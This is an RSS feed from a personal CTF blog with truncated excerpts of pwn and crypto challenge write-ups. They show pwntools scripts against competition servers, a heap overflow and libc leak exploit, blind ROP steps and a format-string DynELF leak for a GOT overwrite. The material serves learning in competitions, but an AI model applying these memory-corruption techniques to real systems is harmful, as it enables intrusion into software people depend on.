<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>pwn on Iluvata&#39;s Blog</title>
    <link>https://iluvata.github.io/tags/pwn/</link>
    <description>Recent content in pwn on Iluvata&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Wed, 26 Apr 2023 13:53:31 +0800</lastBuildDate><atom:link href="https://iluvata.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>BUAACTF2023 WP</title>
      <link>https://iluvata.github.io/post/2023-04-26_buaactf2023/</link>
      <pubDate>Wed, 26 Apr 2023 13:53:31 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2023-04-26_buaactf2023/</guid>
      <description>crypto  Block Cipher  直接写个解密
def decrypt(parts): iv = b&amp;#39;\xba=y\xa3\xc6)\xcf\xf7&amp;#39; key = b&amp;#39;}6E\xeb(\x91\x08\xa0&amp;#39; results = [] for index, part in enumerate(parts): results.append(reduce(xor, [part, iv if index == 0 else parts[index-1], key])) return results      pwn  NLP  pwntools使用。后面的信息提取有点恶心
#encoding: utf-8 from pwn import * p = remote(&amp;#34;10.212.26.206&amp;#34;, &amp;#34;23004&amp;#34;) for i in range(20): p.recvuntil(&amp;#34;A = :&amp;#34;) a = int(p.recvline()) p.recvuntil(&amp;#34;B = :&amp;#34;) b = int(p.</description>
    </item>
    
    <item>
      <title>BUAACTF2022 WP</title>
      <link>https://iluvata.github.io/post/2022-03-28_buaactf2022/</link>
      <pubDate>Mon, 28 Mar 2022 13:53:31 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2022-03-28_buaactf2022/</guid>
      <description>crypto  ez game  求逆，哈希碰撞
from pwn import * from gmpy2 import invert p = remote(&amp;#34;101.43.185.64&amp;#34;, &amp;#34;43089&amp;#34;) # p = remote(&amp;#34;49.232.31.80&amp;#34;, &amp;#34;8088&amp;#34;) p.recvuntil(&amp;#34;y)\n&amp;#34;) p.sendline(&amp;#39;1&amp;#39;) sleep(1) for i in range(300): p.recvuntil(&amp;#34;m): (&amp;#34;) a = int(p.recvuntil(&amp;#34;, &amp;#34;, drop=True)) b = int(p.recvuntil(&amp;#34;)&amp;#34;, drop=True)) # p.interactive() p.sendline(str(invert(a, b))) log.success(str(i)) p.interactive()  from pwn import * x = &amp;#34;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&amp;#34;.decode(&amp;#34;hex&amp;#34;) y = &amp;#34;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&amp;#34;.decode(&amp;#34;hex&amp;#34;) # print(hashlib.md5(x).hexdigest()) # print(hashlib.md5(y).hexdigest()) p = remote(&amp;#34;49.232.31.80&amp;#34;, &amp;#34;8088&amp;#34;) p.recvuntil(&amp;#34;y)\n&amp;#34;) p.sendline(&amp;#39;2&amp;#39;) sleep(2) p.</description>
    </item>
    
    <item>
      <title>pwn堆题整理</title>
      <link>https://iluvata.github.io/post/2021-12-23_heap/</link>
      <pubDate>Thu, 23 Dec 2021 14:55:04 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-12-23_heap/</guid>
      <description>堆溢出  Nnote  花了一周打的UNCTF，光做PWN了，做了7道，就差这道堆题没做出来。最后还有30名以内。。。因为这比赛本身就是入门级的，算是我第一次实战吧。赛后看着wp调试出来。当时应该是找到了漏洞点，但因为基础薄弱最终也没做出来，更别说环境还弄了半天没弄好。。。通过这道题我算是实际开始入门堆了吧。这里是官方wp。
exp环境  题目给的libc是2.31
patchelf --set-rpath ~/glibc-all-in-one/libs/2.31 ./Nnote patchelf --set-interpreter ~/glibc-all-in-one/libs/2.31/ld-2.31.so ./Nnote    泄漏libc  从libc-2.26开始加入了TCache，2.28加入对TCache二次释放的检查. TCache为每个线程加入64个单链表的bins，（64bit系统）以16字节递增，从24B到1032B。每个bins最多放7个chunk。堆开头的0x250的堆块就是tcache_perthread_struct. 在free时，如果chunk大小符合要求，就会在放入fastbins之前放入tcache。分配堆块时若从fastbins中成功返回一个chunk，对应fastbins中其他chunk会被放入对应tcache直到装满。small bins中情况类似。chunk合并时chunk会优先放入tcache。tcache中chunk的PREV_INUSE位和在fastbins中一样不会被清零，因此不会被合并。
 因此这题需要先构造出大于0x410(1040B)的堆块，释放进unsorted bin。需要注意在想释放的堆块后还要再申请一块chunk，防止因为和topchunk相邻而直接合并进topchunk。unsorted bin中如果只有一个chunk，并且这个chunk在上次分配时被使用过时，若申请一个大小属于small bins(32B-1008B)的空间，会直接从该chunk中进行切割，切出低地址部分返回。
 这题申请大小限制不小于0，不大于128，并且根据申请的大小限制了修改时能写入的字节数。但是申请0B的堆块时能通过整数溢出绕过限制条件引起堆溢出。因此这里构造大小为0x480的chunk的方法就是构造9个连在一起的，大小为0x80的chunk（malloc申请的大小为0x78）；然后利用最上面堆块上面的堆溢出覆盖第一块的块大小字段为0x481（块大小字段最低bit为PREV_INUSE）。释放后再申请一个0x80的chunk，会从之前释放到unsorted bin头部割出0x80，导致现在在unsorted bin中的chunk和原来申请的9块中的第二块重叠，输出第二块的数据就可以得到unsorted bin。
add(0) for i in range(9): add(0x78) add(0x18) edit(0 , &amp;#39;a&amp;#39;*0x18+p64(0x481)) delete(1) add(0x78) show(2) __malloc_hook = l64() - 0x70 libc.address = __malloc_hook - libc.sym[&amp;#39;__malloc_hook&amp;#39;]   得到的地址和main_arena(或__malloc_hook)之间的偏移是固定的。可以在gdb调试里看到与__malloc_hook之间的偏移为0x70。
gef➤ bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x558be3001330 —▸ 0x7f6c92886be0 (main_arena+96) ◂— 0x558be3001330 smallbins empty largebins empty gef➤ x/gx &amp;amp;__malloc_hook 0x7f6c92886b70 &amp;lt;__malloc_hook&amp;gt;:	0x0000000000000000    劫持free_hook  这时候申请两个0x40的chunk，序号分别为11和12.</description>
    </item>
    
    <item>
      <title>ROP</title>
      <link>https://iluvata.github.io/post/2021-11-13_rop/</link>
      <pubDate>Sat, 13 Nov 2021 01:57:10 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-11-13_rop/</guid>
      <description> BROP  确定retaddr的偏移   寻找stopgadget  可以用io.recv()是否成功来判断是否为stopdadget，并且可以根据返回的内容大致猜测覆盖的地址是什么函数
  寻找bropgadget  所谓bropgadget其实就是__libc_csu_init里最后一段包含6个连续pop的汇编，对这段汇编进行偏移还能构造出对于另外几个寄存器的pop。 寻找方法也就是在猜测的retaddr后跟6个trap（会导致程序崩溃的retaddr），再跟上之前找到的stopgadget，最后再跟几个trap。验证的方法可以是在跟上6个trap后不跟stopgadget而是直接跟上trap，看是否会崩溃（如果不会崩溃，有可能是遇到了plt表。为什么plt表不会崩溃？因为plt表用jmp直接跳转去执行函数了）。
  寻找puts/write@plt  通过尝试puts出elf头的\x7fELF确定是否遇到了puts的plt
  dump出内存  用之前得到的puts@pltdump出内存
  在dump出的内存中找到任意函数的got，打印出got内容从而确定libc和偏移   ret2libc     SROP   </description>
    </item>
    
    <item>
      <title>libc泄漏</title>
      <link>https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/</link>
      <pubDate>Wed, 10 Nov 2021 12:35:39 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/</guid>
      <description>libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。 ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。 fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。 堆利用中也会有用system覆盖函数got的利用方式。
常见泄漏方法  未知libc版本时  常用的泄漏方法有泄漏某个函数的got内容，根据泄漏的地址用LibcSearcher搜索libc。函数的got地址可以用ELF在目标二进制文件中搜到。 在可以泄漏任意地址内容的时候可以用DynELF。
    格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
def leak(addr): p = remote(&amp;#39;127.0.0.1&amp;#39;, &amp;#39;10001&amp;#39;) p.recvline() payload = &amp;#34;%9$s.AAA&amp;#34; + p32(addr) p.sendline(payload) data = p.recvuntil(&amp;#34;.AAA&amp;#34;)[:-4] + &amp;#34;\x00&amp;#34; log.info(&amp;#34;leaking: 0x%x--&amp;gt; %s&amp;#34; % (addr, data.encode(&amp;#39;hex&amp;#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&amp;#39;system&amp;#39;, &amp;#39;libc&amp;#39;) printf_addr = data.lookup(&amp;#39;printf&amp;#39;, &amp;#39;libc&amp;#39;) log.info(&amp;#34;system address: 0x%x&amp;#34; % system_addr) log.</description>
    </item>
    
    <item>
      <title>CTF基本工具使用指北</title>
      <link>https://iluvata.github.io/post/2021-09-24_ctf-tools/</link>
      <pubDate>Fri, 24 Sep 2021 14:43:07 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-09-24_ctf-tools/</guid>
      <description>环境搭建  在mac上我觉得比较好用的环境是multipass中ubuntu虚拟机+宿主机中的idapro，以及宿主机上vscode写python wp，在虚拟机中运行。
multipass launch 16.04 --name pwn --disk 15G --mem 4G   multipass默认分配的内存和磁盘不太够用，建议内存分4G，磁盘分15G。ubuntu版本选择16.04. 虚拟机内环境配置可以参考pwn-env-init，建议使用py2. 但是脚本是用apt-get安装pip的，可能会有些问题，需要 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py 然后运行 get-pip.py 。还有 one_gadget 目前需要ruby版本高于2.4，apt-get安装的ruby是2.3。可以执行下面的命令安装
 ,#+begin_src shell $ sudo apt-add-repository ppa:brightbox/ruby-ng
 $ sudo apt-get update
 $ sudo apt-get install ruby2.4 ruby2.4-dev
 $ ruby2.4 -v
#+end_src
 还可以装个 tmux ，在pwntools连接gdb调试的时候在开头加上下面代码就可以分出调试窗口（虽然我现在也还没配好pwntools舒服地连gdb的环境。。。）。
context.arch=&amp;#34;amd64&amp;#34; context.terminal = [&amp;#39;tmux&amp;#39;, &amp;#39;splitw&amp;#39;, &amp;#39;-h&amp;#39;]    pwntools  io交互  连接</description>
    </item>
    
  </channel>
</rss>
